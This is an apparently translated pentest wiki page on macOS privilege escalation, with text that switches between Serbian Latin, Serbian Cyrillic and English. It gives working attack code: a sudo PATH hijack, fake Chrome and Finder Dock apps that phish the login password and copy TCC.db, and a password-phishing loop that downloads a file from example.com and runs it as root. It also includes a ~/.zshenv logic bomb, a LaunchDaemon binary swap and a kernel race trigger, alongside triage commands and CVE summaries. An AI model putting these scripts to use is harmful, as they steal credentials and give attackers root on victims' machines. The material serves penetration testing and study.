# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste došli ovde tražeći TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Mnoge tehnike za eskalaciju privilegija koje utiču na Linux ili druge sisteme nalik Unixu primenjuju se i na macOS. Pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcija sa korisnikom

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u objavi o Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada izvršava **`sudo`**. To znači da bi se ovaj napad mogao izvesti i tako što bi se **oteli drugi binarni fajlovi** koje žrtva i dalje izvršava prilikom **pokretanja sudo-a:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Note that a user who uses the terminal will very likely have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering**, you could **impersonate, for example, Google Chrome** in the Dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Some suggestions:

- Check in the Dock if there is a Chrome entry, and if so, **remove** it and **add** the **fake** **Chrome entry in the same position** in the Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete da postavite lažni Finder odmah pored pravog. Da biste to uradili, morate da **dodate lažni Finder unos na početak niza Dock-a**.
- Druga mogućnost je da ga ne postavite u Dock, već samo da ga otvorite; „Finder traži dozvolu da kontroliše Finder“ nije toliko čudno.
- Druga mogućnost da **escalate to root bez traženja** lozinke i bez užasnog dijaloga jeste da podesite Finder tako da zaista zatraži lozinku za izvršavanje privilegovane radnje:
  - Zatražite od Finder-a da kopira novu datoteku **`sudo`** u **`/etc/pam.d`** (U dijalogu za unos lozinke biće navedeno da „Finder želi da kopira sudo“.)
  - Zatražite od Finder-a da kopira novi **Authorization Plugin** (Možete da izaberete ime datoteke tako da u dijalogu za unos lozinke bude navedeno da „Finder želi da kopira Finder.bundle“.)

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing zahteva za lozinku + ponovna upotreba sudo-a

Malware često zloupotrebljava interakciju sa korisnikom da bi **uhvatio lozinku koja omogućava korišćenje sudo-a** i programski je ponovo upotrebio. Uobičajeni tok:

1. Identifikovati prijavljenog korisnika pomoću `whoami`.
2. **Ponavljati zahteve za lozinku** dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširati akreditive (npr. u `/tmp/.pass`) i izvršavati privilegovane radnje pomoću `sudo -S` (lozinka preko stdin-a).

Primer minimalnog lanca:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Украдена лозинка се затим може поново употребити да би се **уклонила Gatekeeper карантинска ознака помоћу `xattr -c`**, копирали LaunchDaemons или други привилеговани фајлови и покренуле додатне фазе без интеракције.<sup>[[1]](#references)</sup>

## Вектори специфични за новије верзије macOS-а (2023–2026)

### Застарели `AuthorizationExecuteWithPrivileges` је и даље употребљив

`AuthorizationExecuteWithPrivileges` је застарео у верзији 10.7, али **и даље ради на Sonoma/Sequoia**. Многи комерцијални алати за ажурирање покрећу `/usr/libexec/security_authtrampoline` са непоузданом путањом. Ако корисник може да уписује у циљни бинарни фајл, можете подметнути тројанца и искористити легитимни упит за ауторизацију:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kombinujte sa **trikovima za lažno predstavljanje iznad** da biste prikazali uverljiv dijalog za unos lozinke.


### Trijaža privilegovanih pomoćnih programa / XPC

Mnogi savremeni macOS privesc napadi na softver trećih strana prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC servis** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim pomoćni program ili **ne proverava klijenta**, proverava ga **prekasno** (PID race) ili izlaže **root metodu** koja koristi **putanju/skriptu pod kontrolom korisnika**. Ova klasa grešaka stoji iza mnogih nedavnih propusta pomoćnih programa u VPN klijentima, pokretačima igara i programima za ažuriranje.<sup>[[2]](#references)</sup>

Brza kontrolna lista za trijažu:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Posebnu pažnju obratite na helper-e koji:

- nastavljaju da prihvataju zahteve **nakon deinstalacije** jer je job ostao učitan u `launchd`
- izvršavaju skripte ili čitaju konfiguraciju iz putanja **`/Applications/...`** ili drugih putanja u koje mogu da pišu korisnici koji nisu root
- oslanjaju se na proveru peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koju je moguće zaobići trkom

Više detalja o greškama u autorizaciji helper-a potražite na [ovoj stranici](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Наслеђивање окружења скрипти PackageKit-а (CVE-2024-27822)

Док Apple није отклонио овај проблем у верзијама **Sonoma 14.5**, **Ventura 13.6.7** и **Monterey 12.7.5**, инсталације које је корисник покренуо преко **`Installer.app`** / **`PackageKit.framework`** могле су да покрену **PKG скрипте као root унутар окружења тренутног корисника**. То значи да би пакет који користи **`#!/bin/zsh`** учитао нападачев **`~/.zshenv`** и покренуо га као **root** када би жртва инсталирала пакет.<sup>[[3]](#references)</sup>

Ово је посебно занимљиво као **logic bomb**: потребан вам је само почетни приступ корисничком налогу и датотека за покретање shell-а у коју може да се пише, а затим чекате да корисник покрене било који рањиви инсталатер заснован на **zsh-у**. Ово се углавном не односи на примене преко **MDM/Munki**, јер се оне извршавају у окружењу root корисника.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Ako želite detaljnije da istražite zloupotrebu specifičnu za instalere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Kolizija odredišta instalera preko `.localized`

Neki instaleri trećih strana registruju root LaunchDaemon čija je izvršna datoteka navedena fiksnom putanjom unutar `/Applications/Target.app`. Ako napadač može prvi da kreira taj bundle sa **drugačijim bundle identifikatorom**, Installer može da sačuva mamac i postavi pravu aplikaciju na `/Applications/Target.localized/Target.app`. Daemon i dalje pokazuje na prvobitnu putanju. Zato izvršna datoteka koju kontroliše napadač, a nalazi se u bundle-u mamcu, kasnije može da se pokrene kao root.<sup>[[8]](#references)</sup>

Važni preduslovi su:<sup>[[8]](#references)</sup>

1. Napadač može da kreira ili kontroliše očekivanu putanju aplikacije.
2. Paket ne uklanja konfliktni bundle.
3. Privilegovani job koristi hardkodiranu putanju unutar tog bundle-a.
4. Korisnik ili MDM workflow instalira paket i registruje job.

Potražite premeštene bundle-ove, a zatim proverite odredišta LaunchDaemon-a pomoću enumeracione petlje u sledećem odeljku:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Bezbedniji instalacioni program određuje konačnu lokaciju bundle-a i čuva privilegovane izvršne datoteke na lokaciji u vlasništvu root-a, kao što je `/Library/PrivilegedHelperTools`. Takođe treba da proveri vlasništvo i potpisivanje koda pre registracije ili pokretanja posla.<sup>[[8]](#references)</sup>

### Preuzimanje writable LaunchDaemon cilja

LaunchDaemon plist može biti u vlasništvu root-a, dok njegov `Program` ili prva stavka u `ProgramArguments` upućuje na direktorijum u koji korisnik može da upisuje. Proverite **celu putanju**, a ne samo dozvole izvršne datoteke. Ako je nadređeni direktorijum upisiv, napadač može da preimenuje izvršnu datoteku u vlasništvu root-a i napravi zamenu na istoj putanji. Zamenska datoteka će se pokrenuti kao root pri sledećem pokretanju posla. Dovoljni su ponovno pokretanje sistema ili uobičajeno ponovno pokretanje servisa. Napadaču nije potrebna dozvola da pokrene `launchctl bootstrap` u sistemskom domenu.<sup>[[7]](#references)</sup>

Prvo navedite svaki cilj i njegov neposredno nadređeni direktorijum:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Kada je datoteka ili njen nadređeni direktorijum upisiv, sačuvajte originalni binary i zamenite putanju izvršnim payload-om. Zatim sačekajte da se već učitani daemon ponovo pokrene.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR trka oko pokazivača kredencijala (CVE-2025-24118)

Ranljivi put `kauth_cred_proc_update` ažurirao je `proc_ro.p_ucred` pomoću neatomskog API-ja `zalloc_ro_mut`, dok su SMR čitači učitavali pokazivač bez zaključavanja. Javni okidač koristi posebno pripremljeni setgid binarni fajl. Jedna nit naizmenično menja stvarni i efektivni ID grupe, dok druga nit više puta poziva sistemski poziv kao što je `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Tretirajte ovo kao **race primitive**, a ne kao gotov root exploit. Objavljeni PoC demonstrira pocepani pokazivač kredencijala. Često se završava panic-om kernela. Istraživač je reprodukovao korupciju samo na Intel platformi i nije demonstrirao determinističku kontrolu nad objektom kredencijala koji nastaje. Apple je u macOS 15.3 promenio ažuriranje tako da koristi atomsku zamenu pokazivača.<sup>[[4]](#references)</sup>

### SIP zaobilaženje putem Migration Assistant-a („Migraine“, CVE-2023-32369)

Čak i ako već imate root pristup, SIP i dalje blokira upisivanje na sistemske lokacije. Greška **Migraine** zloupotrebljava entitlement Migration Assistant-a `com.apple.rootless.install.heritable` za pokretanje podređenog procesa koji nasleđuje SIP zaobilaženje i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Lanac:

1. Ostvarite root pristup na aktivnom sistemu.
2. Pokrenite `systemmigrationd` sa posebno pripremljenim stanjem da bi pokrenuo binarnu datoteku pod kontrolom napadača.
3. Iskoristite nasleđeni entitlement da izmenite datoteke zaštićene SIP-om; izmene opstaju i nakon ponovnog pokretanja.

### NSPredicate/XPC ubacivanje izraza (klasa grešaka CVE-2023-23530/23531)

Više Apple daemona prihvata objekte **NSPredicate** preko XPC-a i proverava samo polje `expressionType`, čiju vrednost kontroliše napadač. Kreiranjem predicate-a koji izvršava proizvoljne selektore možete postići **izvršavanje koda u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). U kombinaciji sa početnim izlaskom iz app sandbox-a, ovo omogućava **eskalaciju privilegija bez upita korisniku**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robusni visitor.<sup>[[6]](#references)</sup>

## TCC - Eskalacija privilegija do root-a

### CVE-2020-9771 - TCC zaobilaženje i eskalacija privilegija preko mount_apfs-a

**Bilo koji korisnik** (čak i oni bez privilegija) može da kreira i montira Time Machine snapshot pomoću opcije `-o noowners` i **pristupi SVIM datotekama** tog snapshot-a, zaobilazeći provere vlasništva na aktivnom volume-u. Jedina potrebna privilegija je da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Komande i celovito objašnjenje nalaze se na stranici o TCC zaobilaženjima:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, godina krađe informacija](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Eskalacija lokalnih privilegija u AWS Client VPN za macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Eskalacija privilegija u macOS PackageKit-u](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine“ SIP zaobilaženje (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Nova klasa grešaka za eskalaciju privilegija u macOS-u i iOS-u (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Otmica LaunchDaemon-a: eskalacija privilegija i održavanje pristupa putem nebezbednih dozvola fascikli](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE putem direktorijuma .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
